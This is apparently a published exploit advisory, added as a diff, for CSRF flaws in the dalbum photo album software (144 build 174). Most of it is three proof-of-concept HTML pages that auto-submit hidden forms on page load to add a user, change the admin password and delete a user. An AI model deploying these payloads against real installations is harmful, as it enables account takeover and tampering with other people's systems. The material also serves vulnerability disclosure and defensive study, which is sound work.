@@ -1,0 +1,80 @@
+dalbum 144 build 174 and earlier CSRF Vulnerabilities
+===================================================================================
+# Exploit Title:dalbum 144_174 and earlier CSRF Vulnerabilities
+# Vendor: http://www.dalbum.org/
+# Download link :http://www.dalbum.org/index.php?go=Downloads
+# Author: Ahmed Elhady Mohamed
+# Email : ahmed.elhady.mohamed@gmail.com
+# version: 144 build 174
+# Category: webapps
+# Tested on: ubuntu 11.4 
+# This vulnerability allows a malicious hacker to add a user 
+  delete a user and change password of a user 
+===================================================================================
+CSRF VUlnerabilities :
+
+POC 1:
+
+	<html>
+	<head>
+	<title>  Add a user </title>
+	<script>
+		function CSRF() {
+			document.getElementById('CSRF').click();
+		};
+	</script>
+	</head>
+	<body onLoad="CSRF()">
+		<form action="http://127.0.0.1/photo/pass.php" method="post" />
+		<input name="user" value="CSRF" type="hidden" />
+		<input name="pass" value="123" type="hidden" />
+		<input name="passc" value="123" type="hidden" />
+		<input type="hidden" name="action" value="add">
+		<input type="submit" id="CSRF" name="submit" value="Submit">
+	</form>
+	</body>
+	</html>
+
+POC 2:
+
+	<html>
+	<head>
+	<title>  Change user's password  </title>
+	<script>
+		function CSRF() {
+			document.getElementById('CSRF').click();
+		};
+	</script>
+	</head>
+	<body onLoad="CSRF()">
+	<form action="http://127.0.0.1/photo/pass.php" method="post" />
+		<input name="user" value="admin" type="hidden" />
+		<input name="pass" value="111" type="hidden" />
+		<input name="passc" value="111" type="hidden" />
+		<input name="change" value="Change password" type="hidden" />
+		<input type="hidden" name="action" value="change">
+		<input type="submit" id="CSRF" name="submit" value="Submit">
+	</form>
+	</body>
+	</html>
+
+POC 3:
+
+	<html>
+	<head>
+	<title>  Delete a user  </title>
+	<script>
+		function CSRF() {
+			document.getElementById('CSRF').click();
+		};
+	</script>
+	</head>
+	<body onLoad="CSRF()">
+	<form action="http://127.0.0.1/photo/pass.php" method="post" />
+		<input name="user" value="a" type="hidden" />
+		<input type="hidden" name="delete" value="Delete">
+		<input type="submit" id="CSRF" name="submit" value="Submit">
+	</form>
+	</body>
+	</html>
+
